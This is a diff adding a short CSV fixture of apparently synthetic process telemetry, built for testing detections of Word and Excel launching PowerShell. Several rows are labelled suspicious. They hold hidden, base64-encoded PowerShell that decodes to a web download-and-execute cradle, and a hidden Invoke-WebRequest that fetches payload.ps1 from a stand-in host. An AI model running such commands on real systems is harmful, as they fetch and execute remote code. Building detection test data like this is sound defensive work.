@@ -1,0 +1,8 @@
+Timestamp,DeviceName,AccountName,FileName,ProcessCommandLine,InitiatingProcessFileName,ProcessId,Scenario
+2026-09-12T09:15:02,FIN-WS-014,alice.smith,powershell.exe,powershell.exe -NoProfile -Command Get-ADUser alice.smith,WINWORD.EXE,4120,Benign Word to PowerShell
+2026-09-12T09:18:11,HR-WS-022,helpdesk01,powershell.exe,powershell.exe -NoProfile -File C:\Scripts\HR-Audit.ps1,EXCEL.EXE,5236,Benign Excel administrative script
+2026-09-12T09:21:44,FIN-WS-019,SYSTEM,powershell.exe,powershell.exe -NoProfile -Command Get-Process,WINWORD.EXE,6112,Benign Word to PowerShell
+2026-09-12T11:18:44,MKT-WS-031,nathan.brooks,powershell.exe,powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA,WINWORD.EXE,7044,Suspicious Encoded PowerShell
+2026-09-12T11:18:46,MKT-WS-031,nathan.brooks,powershell.exe,powershell.exe -NoProfile -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA,WINWORD.EXE,7196,Suspicious Encoded PowerShell plus Network
+2026-09-12T12:05:14,MKT-WS-044,jordan.lee,powershell.exe,powershell.exe -NoProfile -WindowStyle Hidden -Command Invoke-WebRequest https://updates-example.net/payload.ps1,WINWORD.EXE,8224,Gap Test Hidden PowerShell plus Network
+2026-09-12T13:10:21,FIN-WS-014,alice.smith,powershell.exe,powershell.exe -Command Write-Output "Monthly report complete",WINWORD.EXE,8301,Benign Word PowerShell variation
